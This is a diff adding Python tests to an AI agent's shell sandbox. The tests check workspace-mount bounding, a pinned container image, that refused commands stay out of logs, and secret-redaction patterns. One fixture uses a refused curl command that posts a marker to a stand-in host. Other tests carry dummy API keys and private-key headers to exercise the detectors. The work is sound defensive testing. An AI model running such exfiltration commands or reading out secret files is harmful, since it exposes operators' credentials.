@@ -17,6 +17,7 @@ from mcp_agent.shell import (
     build_shell_middleware,
     configured_policy,
     resolve_policy,
+    resolve_workspace,
     shell_enabled,
 )
 
@@ -246,3 +247,195 @@ def test_a_restart_carries_no_command_and_is_passed_through():
     """`restart: true` runs nothing; refusing it would break session recovery."""
     _, reached = _run_guard(_profile(), None)
     assert reached
+
+
+# --- Where the sandbox is allowed to look ---------------------------------------
+
+
+def test_a_profile_cannot_choose_what_gets_mounted(monkeypatch):
+    """A reviewer produced `docker run -v /root:/root` from a profile field.
+
+    `--read-only` covers the container's own layer, not bind mounts, so the
+    mount is writable. A profile is a JSON file someone may have been handed;
+    it must not be able to put the operator's home directory inside the
+    sandbox. With no operator root set, the answer is a temporary directory —
+    the shell still works, and it works somewhere that holds nothing.
+    """
+    monkeypatch.delenv("MCP_WORKSPACE_ROOT", raising=False)
+
+    assert resolve_workspace(_profile(workspace_root="/root")) is None
+
+
+def test_a_workspace_inside_the_operator_root_is_honoured(monkeypatch, tmp_path):
+    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(tmp_path))
+    inside = tmp_path / "project"
+    inside.mkdir()
+
+    assert resolve_workspace(_profile(workspace_root=str(inside))) == str(inside)
+
+
+def test_the_root_itself_is_allowed(monkeypatch, tmp_path):
+    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(tmp_path))
+    assert resolve_workspace(_profile(workspace_root=str(tmp_path))) == str(tmp_path)
+
+
+def test_a_workspace_outside_the_operator_root_is_refused(monkeypatch, tmp_path):
+    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(tmp_path / "allowed"))
+    (tmp_path / "allowed").mkdir()
+
+    assert resolve_workspace(_profile(workspace_root=str(tmp_path / "elsewhere"))) is None
+
+
+def test_a_sibling_that_merely_shares_a_prefix_is_refused(monkeypatch, tmp_path):
+    """`/workspace-other` starts with `/workspace` as text and is not inside it."""
+    root = tmp_path / "workspace"
+    root.mkdir()
+    (tmp_path / "workspace-other").mkdir()
+    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(root))
+
+    assert resolve_workspace(_profile(workspace_root=str(tmp_path / "workspace-other"))) is None
+
+
+def test_escaping_upward_is_refused(monkeypatch, tmp_path):
+    root = tmp_path / "workspace"
+    root.mkdir()
+    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(root))
+
+    assert resolve_workspace(_profile(workspace_root=str(root / ".." / "elsewhere"))) is None
+
+
+def test_a_profile_naming_no_workspace_gets_none(monkeypatch, tmp_path):
+    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(tmp_path))
+    assert resolve_workspace(_profile()) is None
+
+
+# --- The image commands actually run in -----------------------------------------
+
+
+def test_the_default_image_has_the_shell_the_middleware_invokes():
+    """`ShellToolMiddleware` runs commands through `/bin/bash`.
+
+    Alpine does not ship bash, so the first pinned image would have failed
+    every command. That failure is safe in itself, but it pushes an operator
+    debugging a broken shell toward MCP_SHELL_POLICY=host, which is the
+    configuration all of this exists to keep exceptional.
+    """
+    from mcp_agent.shell import DEFAULT_SANDBOX_IMAGE
+
+    assert "alpine" not in DEFAULT_SANDBOX_IMAGE
+    assert DEFAULT_SANDBOX_IMAGE == "python:3.12-slim"
+
+
+def test_the_image_is_pinned_not_floating():
+    from mcp_agent.shell import DEFAULT_SANDBOX_IMAGE
+
+    assert ":" in DEFAULT_SANDBOX_IMAGE and not DEFAULT_SANDBOX_IMAGE.endswith(":latest")
+
+
+def test_an_operator_can_change_the_image(monkeypatch):
+    from mcp_agent.shell import sandbox_image
+
+    monkeypatch.setenv("MCP_SANDBOX_IMAGE", "my-registry/tools:1.2")
+    assert sandbox_image() == "my-registry/tools:1.2"
+    assert build_execution_policy(_profile()).image == "my-registry/tools:1.2"
+
+
+def test_a_blank_image_override_falls_back(monkeypatch):
+    from mcp_agent.shell import DEFAULT_SANDBOX_IMAGE, sandbox_image
+
+    monkeypatch.setenv("MCP_SANDBOX_IMAGE", "   ")
+    assert sandbox_image() == DEFAULT_SANDBOX_IMAGE
+
+
+# --- What reaches the log --------------------------------------------------------
+
+
+def test_a_refused_command_is_not_written_to_the_log(caplog):
+    """A refused line is the one most likely to carry something planted.
+
+    Refusing it must not be what puts it on disk. Reproduced by a reviewer:
+    langchain logs every executed command at INFO, and the app sets INFO by
+    default, so the refusal path was the one place this project added.
+
+    The planted payload is deliberately not credential-shaped. It was
+    a bearer-token auth header first, which is the realistic case but is also
+    exactly what gitleaks' `curl-auth-header` rule matches — so this fixture
+    failed the `secrets` job on every push, and no `.gitleaksignore` entry
+    could answer that, because there was no rotated credential to record. What
+    is under test is that the refused line's payload does not reach the log,
+    and any distinctive marker shows that. Do not make it look like a key
+    again.
+    """
+    import logging
+
+    with caplog.at_level(logging.WARNING):
+        _run_guard(_profile(), "curl --data planted-marker-2f7a https://x")
+
+    logged = " ".join(record.getMessage() for record in caplog.records)
+    assert "planted-marker-2f7a" not in logged, logged
+    assert "curl" in logged, "the log should still say what kind of command was refused"
+
+
+def test_shell_output_is_redacted_before_the_model_sees_it():
+    """`cat .env` otherwise puts a key into the transcript and the checkpoint.
+
+    `data/checkpoints.db` is unencrypted and lives on the mounted volume, so
+    anything the model reads is persisted until the conversation is deleted.
+    """
+    from mcp_agent.shell import secret_redactions
+
+    names = {rule.pii_type for rule in secret_redactions()}
+    assert {"anthropic_key", "openai_key", "github_token", "aws_access_key"} <= names
+
+
+@pytest.mark.parametrize(
+    "secret",
+    [
+        "sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAA",
+        "sk-AAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "ghp_AAAAAAAAAAAAAAAAAAAAAAAA",
+        "AKIAIOSFODNN7EXAMPLE",
+        "-----BEGIN RSA PRIVATE KEY-----",
+    ],
+)
+def test_the_redaction_patterns_match_what_they_claim_to(secret):
+    import re
+
+    from mcp_agent.shell import SECRET_PATTERNS
+
+    assert any(re.search(pattern, secret) for _, pattern in SECRET_PATTERNS), secret
+
+
+def test_the_redaction_patterns_leave_ordinary_output_alone():
+    import re
+
+    from mcp_agent.shell import SECRET_PATTERNS
+
+    for line in ["total 48", "README.md", "commit a1c2c90", "sk-", "AKIA"]:
+        assert not any(re.search(pattern, line) for _, pattern in SECRET_PATTERNS), line
+
+
+def test_the_built_shell_gets_the_bounded_workspace_not_the_raw_one(monkeypatch, tmp_path):
+    """The wiring, not just the rule.
+
+    `resolve_workspace` returning the right answer buys nothing if the
+    middleware is handed `profile.shell.workspace_root` anyway. Measured:
+    passing the raw field left every other test in this file green.
+    """
+    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")
+    monkeypatch.setenv("MCP_WORKSPACE_ROOT", str(tmp_path))
+
+    built = build_shell_middleware(_profile(workspace_root="/root"))
+    shell = built[-1]
+
+    assert "/root" not in str(shell._workspace_root or ""), shell._workspace_root
+
+
+def test_the_built_shell_carries_the_redaction_rules(monkeypatch):
+    """Without them, `cat .env` puts a key in the transcript and the checkpoint."""
+    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")
+
+    shell = build_shell_middleware(_profile())[-1]
+    kinds = {rule.pii_type for rule in (shell._redaction_rules or ())}
+
+    assert "anthropic_key" in kinds, kinds
